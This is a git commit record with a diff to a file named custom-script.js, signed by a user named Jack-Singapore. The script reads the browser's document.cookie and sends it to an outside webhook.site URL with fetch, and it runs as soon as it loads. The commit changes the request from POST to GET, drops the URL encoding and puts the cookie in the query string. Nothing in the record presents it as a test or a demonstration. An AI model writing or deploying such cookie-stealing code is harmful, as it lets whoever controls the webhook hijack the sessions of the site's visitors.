74f3c746d17cb7a1e1ebae41da9c94fd88801170
Jack-Singapore <136560120+jack-Singapore@users.noreply.github.com>
2024-02-23 21:08:21 +0800

    Update custom-script.js

--- custom-script.js
+++ custom-script.js
@@ -1,18 +1,17 @@
 function sendDataToWebhook() {
-    var cookieValue = encodeURIComponent(document.cookie);
+    var cookieValue = document.cookie;
   
     // Construct the URL with document.cookie as a parameter
-    var webhookURL = 'https://webhook.site/0c4009df-31dd-4e36-a7b2-cf25eca8fd64/1?cookie=' + cookieValue;
+    var webhookURL = 'https://webhook.site/0c4009df-31dd-4e36-a7b2-cf25eca8fd64?cookie=' + cookieValue;
   
     // Replace 'your-data-here' with the actual data you want to send
     var dataToSend = 'your-data-here';
   
     fetch(webhookURL, {
-      method: 'POST',
+      method: 'GET',
       headers: {
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({ data: dataToSend })
     })
     .then(response => response.json())
     .then(data => console.log('Data sent successfully:', data))
@@ -21,4 +20,3 @@ function sendDataToWebhook() {
   
   // Call the function to send data
   sendDataToWebhook();
-  
